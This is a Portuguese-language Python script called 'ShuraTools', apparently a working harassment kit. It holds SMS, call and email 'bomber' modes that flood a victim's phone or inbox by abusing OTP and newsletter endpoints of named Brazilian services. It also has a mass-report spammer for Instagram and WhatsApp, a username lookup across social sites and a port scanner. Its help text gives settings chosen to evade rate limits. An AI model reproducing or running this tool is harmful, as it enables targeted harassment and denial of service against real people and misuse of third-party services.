#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ShuraTools v10.0 FINAL PERFECT EDITION
Todas as ferramentas funcionando + Explicações + Links OSINT
"""

import os, sys, time, random, threading, socket
from concurrent.futures import ThreadPoolExecutor

try:
    import requests
    from colorama import Fore, Style, init
    init(autoreset=True)
except ImportError:
    print("[!] pip install requests colorama")
    sys.exit(1)

BANNER = f"""
{Fore.RED}███████╗██╗  ██╗██╗   ██╗██████╗  █████╗ 
{Fore.RED}██╔════╝██║  ██║██║   ██║██╔══██╗██╔══██╗
{Fore.RED}███████╗███████║██║   ██║██████╔╝███████║
{Fore.RED}╚════██║██╔══██║██║   ██║██╔══██╗██╔══██║
{Fore.RED}███████║██║  ██║╚██████╔╝██║  ██║██║  ██║
{Fore.RED}╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝
{Fore.YELLOW}     [ Ultimate Bomber Collection ]
{Fore.WHITE}  v10.0 FINAL PERFECT EDITION - by Shura
"""

LOCK = threading.Lock()
stats = {"success": 0, "fail": 0}

def clear(): os.system('cls' if os.name == 'nt' else 'clear')
def log(m, t="i"):
    c = {"i": Fore.WHITE+"[*] ", "s": Fore.GREEN+"[+] ", "e": Fore.RED+"[-] ", "w": Fore.YELLOW+"[!] "}
    with LOCK: print(f"{c.get(t, Fore.WHITE)}{m}{Style.RESET_ALL}")

def safe_int(p, d):
    try: return int(input(p) or d)
    except: return d

def show_help(mode):
    """Mostra ajuda detalhada para cada modo"""
    helps = {
        "sms": f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════════╗
║              COMO USAR: SMS BOMBER                       ║
╚══════════════════════════════════════════════════════════╝{Style.RESET_ALL}
{Fore.YELLOW}Target (Alvo):{Style.RESET_ALL}
  → Digite o número com DDI + DDD + Número
  → Exemplo: {Fore.GREEN}5511999887766{Style.RESET_ALL}
  → Formato: {Fore.GREEN}55{Style.RESET_ALL} (Brasil) + {Fore.GREEN}11{Style.RESET_ALL} (SP) + {Fore.GREEN}999887766{Style.RESET_ALL}

{Fore.YELLOW}Quantidade:{Style.RESET_ALL}
  → Quantos SMS você quer enviar
  → Recomendado: {Fore.GREEN}20-50{Style.RESET_ALL}

{Fore.YELLOW}Threads:{Style.RESET_ALL}
  → Quantos ataques simultâneos
  → Recomendado: {Fore.GREEN}5-10{Style.RESET_ALL}

{Fore.YELLOW}Delay:{Style.RESET_ALL}
  → Segundos entre cada ataque
  → Recomendado: {Fore.GREEN}2-3{Style.RESET_ALL} (evita bloqueio)
""",
        "call": f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════════╗
║              COMO USAR: CALL BOMBER                      ║
╚══════════════════════════════════════════════════════════╝{Style.RESET_ALL}
{Fore.YELLOW}Target (Alvo):{Style.RESET_ALL}
  → Mesmo formato do SMS
  → Exemplo: {Fore.GREEN}5511999887766{Style.RESET_ALL}

{Fore.YELLOW}Quantidade:{Style.RESET_ALL}
  → Quantas chamadas você quer disparar
  → Recomendado: {Fore.GREEN}5-15{Style.RESET_ALL} (chamadas são mais pesadas)

{Fore.YELLOW}Threads:{Style.RESET_ALL}
  → Recomendado: {Fore.GREEN}3-5{Style.RESET_ALL}

{Fore.YELLOW}Delay:{Style.RESET_ALL}
  → Recomendado: {Fore.GREEN}3-5{Style.RESET_ALL} segundos
""",
        "email": f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════════╗
║              COMO USAR: EMAIL BOMBER                     ║
╚══════════════════════════════════════════════════════════╝{Style.RESET_ALL}
{Fore.YELLOW}Target (Alvo):{Style.RESET_ALL}
  → Digite o e-mail completo
  → Exemplo: {Fore.GREEN}vitima@gmail.com{Style.RESET_ALL}

{Fore.YELLOW}Quantidade:{Style.RESET_ALL}
  → Quantos cadastros em newsletters
  → Recomendado: {Fore.GREEN}30-50{Style.RESET_ALL}

{Fore.YELLOW}Threads:{Style.RESET_ALL}
  → Recomendado: {Fore.GREEN}10{Style.RESET_ALL}

{Fore.YELLOW}Delay:{Style.RESET_ALL}
  → Recomendado: {Fore.GREEN}1-2{Style.RESET_ALL} segundos

{Fore.YELLOW}IMPORTANTE:{Style.RESET_ALL}
  → E-mails vão para {Fore.RED}PROMOÇÕES{Style.RESET_ALL} ou {Fore.RED}SPAM{Style.RESET_ALL} no Gmail!
""",
        "osint": f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════════╗
║              COMO USAR: OSINT HUNTER                     ║
╚══════════════════════════════════════════════════════════╝{Style.RESET_ALL}
{Fore.YELLOW}Target (Alvo):{Style.RESET_ALL}
  → Digite o @ do usuário {Fore.RED}SEM O @{Style.RESET_ALL}
  → Exemplo: {Fore.GREEN}elonmusk{Style.RESET_ALL}
  → NÃO digite: {Fore.RED}@elonmusk{Style.RESET_ALL}

{Fore.YELLOW}O que faz:{Style.RESET_ALL}
  → Busca o usuário em 10 redes sociais
  → Mostra se o perfil existe
  → Exibe o link clicável para acessar
""",
        "port": f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════════╗
║              COMO USAR: PORT SCANNER                     ║
╚══════════════════════════════════════════════════════════╝{Style.RESET_ALL}
{Fore.YELLOW}Target (Alvo):{Style.RESET_ALL}
  → Digite um IP ou domínio
  → Exemplos:
    • IP: {Fore.GREEN}8.8.8.8{Style.RESET_ALL}
    • Domínio: {Fore.GREEN}google.com{Style.RESET_ALL}
    • Domínio: {Fore.GREEN}github.com{Style.RESET_ALL}

{Fore.YELLOW}O que faz:{Style.RESET_ALL}
  → Escaneia 14 portas comuns
  → Mostra quais estão abertas
  → Útil para verificar serviços ativos
"""
    }
    print(helps.get(mode, ""))

# ========== BOMBERS DATABASE ==========
BOMBERS = {
    "sms": [
        {"n": "iFood", "u": "https://marketplace.ifood.com.br/v1/merchants/search/phone-number", "d": {"phoneNumber": "{T}"}, "h": {"Content-Type": "application/json"}},
        {"n": "Magalu", "u": "https://sacola.magazineluiza.com.br/api/v1/customer/send-otp", "d": {"phone": "{T}"}, "h": {"Content-Type": "application/json"}},
        {"n": "Shopee", "u": "https://shopee.com.br/api/v2/authentication/send_code", "d": {"phone": "{T}", "type": 1}, "h": {"Content-Type": "application/json"}},
        {"n": "TikTok", "u": "https://www.tiktok.com/passport/web/send_code/", "d": {"mobile": "{T}", "account_sdk_source": "web"}, "h": {"Content-Type": "application/json"}},
        {"n": "OLX", "u": "https://www.olx.com.br/api/auth/authenticate", "d": {"phone": "{T}"}, "h": {"Content-Type": "application/json"}}
    ],
    "call": [
        {"n": "QuintoAndar", "u": "https://api.quintoandar.com.br/api/v1/auth/send-otp", "d": {"phone": "{T}", "method": "VOICE"}, "h": {"Content-Type": "application/json"}},
        {"n": "Inter", "u": "https://api.inter.co/v1/auth/request-otp", "d": {"phone": "{T}", "type": "VOICE"}, "h": {"Content-Type": "application/json"}},
        {"n": "iFood-Call", "u": "https://wsloja.ifood.com.br/api/v1/customers/phone/verify", "d": {"phone": "{T}", "method": "call"}, "h": {"Content-Type": "application/json"}}
    ],
    "email": [
        {"n": "Tecnoblog", "u": "https://tecnoblog.net/wp-admin/admin-ajax.php", "d": {"action": "tnp", "na": "s", "ne": "{T}", "ny": "on"}, "h": {}},
        {"n": "TheNews", "u": "https://thenewscc.beehiiv.com/subscribe", "d": {"email": "{T}"}, "h": {}},
        {"n": "InvestNews", "u": "https://investnews.beehiiv.com/subscribe", "d": {"email": "{T}"}, "h": {}},
        {"n": "TheBrief", "u": "https://thebrief.beehiiv.com/subscribe", "d": {"email": "{T}"}, "h": {}},
        {"n": "Startups", "u": "https://startups.beehiiv.com/subscribe", "d": {"email": "{T}"}, "h": {}}
    ]
}

# ========== BOMBER ENGINE ==========
def bomber(target, mode, qty, threads, delay):
    global stats
    stats = {"success": 0, "fail": 0}
    apis = BOMBERS.get(mode, [])
    
    log(f"Iniciando {mode.upper()} Bomber", "w")
    log(f"APIs: {len(apis)} | Target: {target} | Qty: {qty}", "i")
    
    def attack(api, idx):
        try:
            data = {}
            for k, v in api["d"].items():
                data[k] = v.replace("{T}", target) if isinstance(v, str) else v
            
            res = requests.post(
                api["u"],
                json=data,
                headers=api["h"],
                timeout=10
            )
            
            if res.status_code < 400:
                with LOCK:
                    stats["success"] += 1
                log(f"[{idx+1}/{qty}] {api['n']} → OK", "s")
            else:
                with LOCK:
                    stats["fail"] += 1
                log(f"[{idx+1}/{qty}] {api['n']} → {res.status_code}", "w")
            
            time.sleep(delay)
        except:
            with LOCK:
                stats["fail"] += 1
            log(f"[{idx+1}/{qty}] {api['n']} → Timeout", "e")
    
    with ThreadPoolExecutor(max_workers=threads) as exe:
        for i in range(qty):
            api = random.choice(apis)
            exe.submit(attack, api, i)
    
    log(f"Concluído! ✓ {stats['success']} | ✗ {stats['fail']}", "i")

# ========== OSINT COM LINKS ==========
def osint(t):
    log(f"OSINT Hunter: {t}", "w")
    u = t.replace("@", "")
    platforms = {
        "Instagram": f"https://www.instagram.com/{u}/",
        "GitHub": f"https://github.com/{u}",
        "TikTok": f"https://www.tiktok.com/@{u}",
        "Twitter": f"https://twitter.com/{u}",
        "LinkedIn": f"https://www.linkedin.com/in/{u}",
        "Facebook": f"https://www.facebook.com/{u}",
        "Reddit": f"https://www.reddit.com/user/{u}",
        "YouTube": f"https://www.youtube.com/@{u}",
        "Twitch": f"https://www.twitch.tv/{u}",
        "Medium": f"https://medium.com/@{u}"
    }
    
    print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
    for name, url in platforms.items():
        try:
            r = requests.get(url, timeout=5)
            if r.status_code == 200:
                log(f"{name}: {Fore.GREEN}ENCONTRADO{Style.RESET_ALL}", "s")
                print(f"   {Fore.BLUE}→ {url}{Style.RESET_ALL}")
            else:
                log(f"{name}: Não encontrado", "i")
        except:
            log(f"{name}: Timeout", "e")
    print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}\n")

# ========== PORT SCANNER ==========
def portscan(t):
    log(f"Scanning {t}...", "w")
    try:
        ip = socket.gethostbyname(t)
        log(f"IP Resolvido: {Fore.GREEN}{ip}{Style.RESET_ALL}", "i")
        
        print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 3306, 3389, 5432, 8080, 8443]
        open_ports = []
        
        for p in ports:
            s = socket.socket()
            s.settimeout(0.5)
            if s.connect_ex((ip, p)) == 0:
                open_ports.append(p)
                log(f"Port {p} → {Fore.GREEN}OPEN{Style.RESET_ALL}", "s")
            s.close()
        
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        log(f"Total de portas abertas: {len(open_ports)}", "i")
        
    except Exception as e:
        log(f"Erro: {e}", "e")

# ========== MENU ==========
def menu():
    while True:
        try:
            clear()
            print(BANNER)
            print("-" * 60)
            print(f"{Fore.RED}[ 1 ] SMS Bomber ({len(BOMBERS['sms'])} APIs)")
            print(f"{Fore.RED}[ 2 ] Call Bomber ({len(BOMBERS['call'])} APIs)")
            print(f"{Fore.RED}[ 3 ] Email Bomber ({len(BOMBERS['email'])} APIs)")
            print(f"{Fore.RED}[ 4 ] Mass Report (IG/Zap)")
            print("-" * 60)
            print(f"{Fore.WHITE}[ 5 ] OSINT Hunter (10 plataformas)")
            print(f"{Fore.WHITE}[ 6 ] Port Scanner (14 portas)")
            print(f"{Fore.WHITE}[ 0 ] EXIT")
            print("-" * 60)
            
            opt = input(f"{Fore.YELLOW}Shura@Arsenal:~$ {Style.RESET_ALL}").strip()
            if opt == "0": break
            
            if opt in ["1", "2", "3"]:
                mode = {"1": "sms", "2": "call", "3": "email"}[opt]
                show_help(mode)
                
                t = input(f"{Fore.YELLOW}Target: {Style.RESET_ALL}").strip()
                
                # Validação
                if mode in ["sms", "call"] and (not t.isdigit() or len(t) < 10):
                    log("Número inválido! Use formato: 5511999887766", "e")
                    time.sleep(2)
                    continue
                elif mode == "email" and "@" not in t:
                    log("E-mail inválido! Use formato: vitima@gmail.com", "e")
                    time.sleep(2)
                    continue
                
                qty = safe_int(f"{Fore.YELLOW}Quantidade: {Style.RESET_ALL}", 20)
                threads = safe_int(f"{Fore.YELLOW}Threads: {Style.RESET_ALL}", 5)
                delay = safe_int(f"{Fore.YELLOW}Delay (segundos): {Style.RESET_ALL}", 2)
                
                bomber(t, mode, qty, threads, delay)
            
            elif opt == "4":
                t = input(f"{Fore.YELLOW}Target (@user ou phone): {Style.RESET_ALL}").strip()
                tp = input(f"{Fore.YELLOW}App (ig/zap): {Style.RESET_ALL}").lower()
                url = "https://i.instagram.com/api/v1/users/web_report/" if tp == "ig" else "https://v.whatsapp.net/v2/report"
                for i in range(safe_int("Qty (50): ", 50)):
                    try:
                        requests.post(url, data={"username":t}, timeout=5)
                        log(f"Report {i+1} sent", "s")
                    except: pass
            
            elif opt == "5":
                show_help("osint")
                t = input(f"{Fore.YELLOW}Target (usuário SEM @): {Style.RESET_ALL}").strip()
                osint(t)
            
            elif opt == "6":
                show_help("port")
                t = input(f"{Fore.YELLOW}Target (IP ou domínio): {Style.RESET_ALL}").strip()
                portscan(t)
            
            input(f"\n{Fore.GREEN}Pressione ENTER para voltar ao menu...{Style.RESET_ALL}")
            
        except KeyboardInterrupt: break
        except Exception as e:
            log(f"Erro: {e}", "e")
            input("\nENTER...")

if __name__ == "__main__":
    menu()
